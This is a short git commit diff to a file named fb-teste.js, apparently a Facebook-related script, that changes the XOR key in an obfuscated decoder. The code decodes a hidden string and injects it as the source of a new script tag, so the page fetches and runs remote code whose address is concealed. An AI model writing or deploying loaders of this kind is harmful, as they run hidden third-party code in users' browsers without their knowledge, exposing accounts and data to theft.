d37e74be7f45705d930b85e9a04f463130b68b18
MasterTools <equipemastertools@gmail.com>
2013-12-01 13:16:09 -0200

    Update fb-teste.js

--- fb-teste.js
+++ fb-teste.js
@@ -133,7 +133,7 @@ Z = "";
 var V;
 V = X.length;
 for (i = 0; i < V; i++) {
-    Y += String.fromCharCode(X.charCodeAt(i) ^ 1)
+    Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
 }
 Z = unescape(Y);
 document.body.appendChild(document.createElement('script')).src = Z;
